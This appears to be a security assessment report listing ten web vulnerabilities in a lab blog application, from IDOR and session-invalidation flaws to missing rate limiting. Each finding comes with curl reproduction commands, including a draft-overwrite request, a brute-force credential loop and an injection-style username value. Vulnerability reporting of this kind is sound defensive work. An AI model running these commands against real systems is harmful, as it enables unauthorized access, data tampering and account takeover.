title: Insecure Direct Object Reference (IDOR) - Cross-User Data Access
description: Authenticated users can access other users' draft resources by changing the username in the URL path. The application uses username-based routing for `/<username>/drafts` without verifying that the requested username matches the authenticated user, allowing unauthorized read access to other users' drafts.
steps:
1. Login as a normal user and save the session cookie: `curl -s -c /tmp/user1_session.txt -d "username=user1&password=pass1" http://blog:5003/login`.
2. Access the logged-in user's drafts: `curl -s -b /tmp/user1_session.txt http://blog:5003/user1/drafts`.
3. Request another user's drafts by changing the path username, for example:
   - `curl -s -b /tmp/user1_session.txt http://blog:5003/testuser/drafts`
   - `curl -s -b /tmp/user1_session.txt http://blog:5003/weakuser1/drafts`
   - `curl -s -b /tmp/user1_session.txt http://blog:5003/user2/drafts`
4. Observe that other users' draft pages are returned successfully.

title: IDOR - Unauthorized Draft Modification
description: Authenticated users can view and modify drafts belonging to other users, including admin-owned drafts, by accessing predictable draft IDs on `/edit_draft/<id>`. The application does not validate ownership before exposing the edit form or processing updates, resulting in unauthorized modification of other users' content.
steps:
1. Login as a standard user and save the session cookie.
2. Access another user's draft edit page, for example: `curl -s -b /tmp/user1_session.txt http://blog:5003/edit_draft/1`.
3. Observe that the response returns an edit form for a foreign draft.
4. Submit an unauthorized modification: `curl -s -b /tmp/user1_session.txt -X POST -d "title=HACKED_BY_USER1&content=IDOR+Proof+of+Concept&status=published" http://blog:5003/edit_draft/1`.
5. Verify the modification by viewing the victim's drafts, e.g. `curl -s -b /tmp/user1_session.txt http://blog:5003/admin/drafts | grep "HACKED_BY_USER1"`.

title: Session Invalidation Failure
description: The logout endpoint does not properly invalidate the session server-side. A previously issued session cookie remains valid after logout, so a reused cookie can still access authenticated functionality. This means stolen or retained session cookies cannot be effectively revoked by logging out.
steps:
1. Login and capture the session cookie: `curl -s -c /tmp/session_test.txt -d "username=testuser&password=testpass123" http://blog:5003/login`.
2. Confirm the session works: `curl -s -b /tmp/session_test.txt http://blog:5003/dashboard`.
3. Logout: `curl -s -b /tmp/session_test.txt http://blog:5003/logout`.
4. Reuse the same cookie against `/dashboard`: `curl -s -b /tmp/session_test.txt http://blog:5003/dashboard`.
5. Observe that the session is still accepted and access continues.
6. Inspect the saved cookie and note it remains unchanged after logout.

title: Timing-Based Account Enumeration
description: The login endpoint shows measurable response-time differences between existing and non-existing usernames. Existing usernames trigger bcrypt password verification and respond significantly slower than invalid usernames, allowing attackers to enumerate valid accounts through timing analysis.
steps:
1. Send repeated login attempts for an existing username with an incorrect password and measure response times.
2. Send repeated login attempts for non-existent usernames and measure response times.
3. Example for an existing user:
   `for i in 1 2 3 4 5; do START=$(date +%s%N); curl -s -d "username=testuser&password=wrongpass" http://blog:5003/login > /dev/null; END=$(date +%s%N); echo "Run $i: $(( (END - START) / 1000000 )) ms"; done`
4. Example for invalid users:
   `for i in 1 2 3 4 5; do START=$(date +%s%N); curl -s -d "username=nonexistent$i&password=wrongpass" http://blog:5003/login > /dev/null; END=$(date +%s%N); echo "Run $i: $(( (END - START) / 1000000 )) ms"; done`
5. Observe that valid usernames respond much slower, approximately ~220ms versus ~33ms.

title: No Password Complexity Policy
description: The registration functionality accepts trivially weak passwords, including one-character passwords, numeric-only passwords, common dictionary passwords, and passwords containing spaces. No password complexity or strength requirements are enforced, allowing creation of easily guessable credentials.
steps:
Submit registration requests with weak passwords and observe successful account creation, for example:
- `curl -s -d "username=weakuser1&password=a&confirm_password=a" http://blog:5003/register`
- `curl -s -d "username=numuser1&password=123456&confirm_password=123456" http://blog:5003/register`
- `curl -s -d "username=commonuser1&password=password&confirm_password=password" http://blog:5003/register`
- `curl -s -d "username=spaceuser1&password=pass+word&confirm_password=pass+word" http://blog:5003/register`
Then verify login succeeds with one of the weak passwords.

title: HTTP Parameter Pollution (HPP)
description: The application processes duplicate request parameters inconsistently across endpoints. It commonly uses the first occurrence of a repeated parameter, creating opportunities for validation bypasses, authentication confusion, and other unexpected behavior when crafted requests include duplicate keys.
steps:
1. Send a login request with duplicate parameters: `curl -s -d "username=admin&username=test&password=testpass123" http://blog:5003/login`.
2. Observe that the application processes the first `username` value.
3. Send a registration request with duplicate password parameters: `curl -s -d "username=test&password=test123&password=other456&confirm_password=test123" http://blog:5003/register`.
4. Observe that the first password value is used.
5. Test edge cases such as altered parameter casing, for example: `curl -s -d "Username=TESTUSER&password=testpass123" http://blog:5003/login`, and note inconsistent behavior.

title: Session Cookie Issued on Failed Registration
description: The application issues a new session cookie even when registration fails validation. Failed registration responses include `Set-Cookie` for a session containing `_fresh: False`, creating unnecessary session state and introducing session-management weaknesses such as session fixation potential and cookie accumulation.
steps:
1. Submit an invalid registration request and inspect response headers:
   `curl -s -D - -d "username=admin'%20OR%201=1--&password=test&confirm_password=test" http://blog:5003/register`
2. Observe a response header similar to `Set-Cookie: session=...` even though registration failed.
3. Decode the session cookie and confirm it contains state such as `{'_fresh': False}`.

title: No Rate Limiting or Account Lockout
description: The login endpoint lacks rate limiting, account lockout, or CAPTCHA protections. Attackers can perform unlimited credential stuffing or brute-force attempts without being blocked or throttled.
steps:
Send numerous consecutive login attempts with different username and password combinations and observe that all requests are processed normally without lockout or throttling. Example:
`for user in admin test user root administrator; do for pass in admin password password123 test test123 root 123456; do curl -s -d "username=$user&password=$pass" http://blog:5003/login; done; done`

title: Sequential User IDs in Session Cookies
description: Flask session cookies contain predictable sequential `_user_id` values visible when decoded. These identifiers enable user enumeration and can facilitate further attacks such as targeted access-control testing.
steps:
1. Authenticate and capture a session cookie.
2. Decode the cookie using a tool such as:
   `flask-unsign --decode --cookie "$(cat /tmp/user1_session.txt | grep session | cut -f7)" --no-literal-eval`
3. Observe fields such as `_user_id` with sequential values like `1`, `2`, `3`, or `12`.
4. Compare cookies across multiple users to confirm predictability.

title: Trailing Slash Returns 404
description: Application endpoints such as `/login`, `/register`, and `/dashboard` return HTTP 404 when accessed with trailing slashes, while the same routes work without trailing slashes. This creates inconsistent routing behavior and can cause broken links or user confusion.
steps:
Request application endpoints with and without trailing slashes and compare responses, for example:
- `curl -s http://blog:5003/login` returns HTTP 200
- `curl -s http://blog:5003/login/` returns HTTP 404
- `curl -s http://blog:5003/register` returns HTTP 200
- `curl -s http://blog:5003/register/` returns HTTP 404
- `curl -s http://blog:5003/dashboard/` returns HTTP 404
